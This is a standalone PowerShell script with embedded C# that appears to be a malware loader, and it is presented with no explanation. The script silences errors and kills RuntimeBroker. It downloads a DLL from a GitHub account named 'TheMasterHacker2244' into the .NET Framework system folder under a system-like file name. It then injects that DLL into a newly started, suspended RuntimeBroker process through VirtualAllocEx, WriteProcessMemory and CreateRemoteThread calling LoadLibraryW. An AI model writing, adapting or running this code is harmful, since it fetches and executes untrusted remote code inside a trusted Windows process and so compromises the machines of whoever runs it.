$ErrorActionPreference = 'SilentlyContinue'
$dllPath = "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
$processName = 'RuntimeBroker'
$processPath = "$env:SystemRoot\System32\$processName.exe"
Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2
New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll" -OutFile $dllPath -ErrorAction Stop
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class I{
    [DllImport("kernel32", SetLastError=true)]
    static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32", SetLastError=true)]
    static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32", SetLastError=true)]
    static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32", SetLastError=true)]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32", SetLastError=true)]
    static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32", SetLastError=true)]
    static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32", SetLastError=true)]
    static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32", SetLastError=true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32", SetLastError=true)]
    static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
    [DllImport("kernel32", SetLastError=true)]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);
    [DllImport("kernel32")] static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32")] static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO{
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION{
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    const uint CREATE_SUSPENDED = 0x00000004;
    const uint STILL_ACTIVE = 259;
    public static bool InjectSuspended(string targetPath, string dllPath){
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;
        if(!CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi)) return false;
        IntPtr hProcess = pi.hProcess;
        IntPtr hThread = pi.hThread;
        byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
        uint dllSize = (uint)dllBytes.Length;
        IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllSize, 0x3000, 0x4);
        if(remoteMem == IntPtr.Zero){ CloseHandle(hProcess); CloseHandle(hThread); return false; }
        uint written;
        WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, out written);
        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
        IntPtr loadLib = GetProcAddress(kernel32, "LoadLibraryW");
        IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, remoteMem, 0, IntPtr.Zero);
        if(remoteThread == IntPtr.Zero){ VirtualFreeEx(hProcess, remoteMem, 0, 0x8000); CloseHandle(hProcess); CloseHandle(hThread); return false; }
        WaitForSingleObject(remoteThread, 0xFFFFFFFF);
        uint exitCode = 0;
        GetExitCodeThread(remoteThread, out exitCode);
        CloseHandle(remoteThread);
        if(exitCode == 0){ VirtualFreeEx(hProcess, remoteMem, 0, 0x8000); CloseHandle(hProcess); CloseHandle(hThread); return false; }
        uint resume = 0;
        while(WaitForSingleObject(hThread, 0) == 0x102){ resume = ResumeThread(hThread); }
        // Wait a moment and verify the process is still alive
        WaitForSingleObject(hProcess, 2000);
        uint procExitCode;
        GetExitCodeProcess(hProcess, out procExitCode);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return procExitCode == STILL_ACTIVE;
    }
}
'@ -ReferencedAssemblies System.Runtime.InteropServices
if ([I]::InjectSuspended($processPath, $dllPath)) { Write-Host "Injected" }
